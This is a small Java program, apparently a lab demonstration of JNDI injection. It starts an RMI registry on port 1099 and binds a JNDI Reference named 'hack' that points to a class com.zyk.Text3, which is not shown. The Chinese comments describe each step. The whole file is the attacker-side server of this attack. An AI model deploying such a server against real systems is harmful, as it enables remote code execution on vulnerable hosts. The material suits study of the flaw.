package com.zyk;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;



public class HackService {

    public static void main(String[] args) {
        try {
            //启动一个远程对象注册表的服务
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            //创建资源
            Reference reference = new Reference("com.zyk.Text3", "com.zyk.Text3", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            //远程对象注册到RMI注册服务器
            registry.bind("hack", referenceWrapper);
            System.out.println("服务初始化完成");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
